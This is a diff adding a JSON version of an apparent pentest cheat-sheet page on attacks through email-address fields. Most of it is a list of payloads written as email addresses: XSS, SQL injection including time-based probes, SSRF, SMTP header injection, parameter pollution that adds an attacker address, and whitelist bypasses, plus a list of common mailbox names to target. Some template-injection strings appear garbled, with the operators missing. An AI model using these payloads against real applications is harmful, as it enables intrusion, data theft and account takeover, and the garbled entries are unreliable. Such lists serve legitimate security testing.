@@ -1,0 +1,119 @@
+{
+    "title": "Email attacks",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Attacks",
+            "url": "/enumeration/web"
+        }
+    ],
+    "sections": [
+        {
+            "type": "table",
+            "headers": [
+                "Attack",
+                "Payload"
+            ],
+            "rows": [
+                {
+                    "Attack": "XSS",
+                    "Payload": "test+(alert(0))@example.com\ntest@example(alert(0)).com\n\"alert(0)\"@example.com\n<script src=//xsshere?”@email.com"
+                },
+                {
+                    "Attack": "Template injection",
+                    "Payload": "\"<%= 7  7 %>\"@example.com\n test+(${{77}})@example.com"
+                },
+                {
+                    "Attack": "SQLi",
+                    "Payload": "\"' OR 1=1 -- '\"@example.com \n\"mail'); SELECT version();--\"@example.com\na'-IF(LENGTH(database())=9,SLEEP(7),0)or'1'='1\\\"@a.com"
+                },
+                {
+                    "Attack": "SSRF",
+                    "Payload": "john.doe@abc123.burpcollaborator.net\njohn.doe@[127.0.0.1]"
+                },
+                {
+                    "Attack": "Parameter Pollution",
+                    "Payload": "victim\\&email=attacker@example.com"
+                },
+                {
+                    "Attack": "(Email) Header Injection",
+                    "Payload": "\"%0d%0aContent-Length:%200%0d%0a%0d%0a\"@example.com\n\"recipient@test.com>\\r\\nRCPT TO:<victim+\"@test.com"
+                },
+                {
+                    "Attack": "Wildcard abuse",
+                    "Payload": "%@example.com"
+                }
+            ]
+        },
+        {
+            "type": "code_block",
+            "content": [
+                "# Bypass whitelist",
+                "inti(;inti@inti.io;)@whitelisted.com",
+                "inti@inti.io(@whitelisted.com)",
+                "inti+(@whitelisted.com;)@inti.io",
+                "",
+                "#HTML Injection in Gmail",
+                "inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com",
+                "",
+                "# Bypass strict validators",
+                "# Login with SSO & integrations",
+                "GitHub & Salesforce allow xss in email, create account and abuse with login integration",
+                "",
+                "# Common email accounts",
+                "support@",
+                "jira@",
+                "print@",
+                "feedback@",
+                "asana@",
+                "slack@",
+                "hello@",
+                "bug(s)@",
+                "upload@",
+                "service@",
+                "it@",
+                "test@",
+                "help@",
+                "tickets@",
+                "tweet@"
+            ]
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2020-12-15T08:05:41.099Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/web/email-attacks.md",
+        "previous_page": {
+            "title": "Session fixation",
+            "url": "/enumeration/web/session-fixation"
+        },
+        "next_page": {
+            "title": "Pastejacking",
+            "url": "/enumeration/web/pastejacking"
+        }
+    }
+}
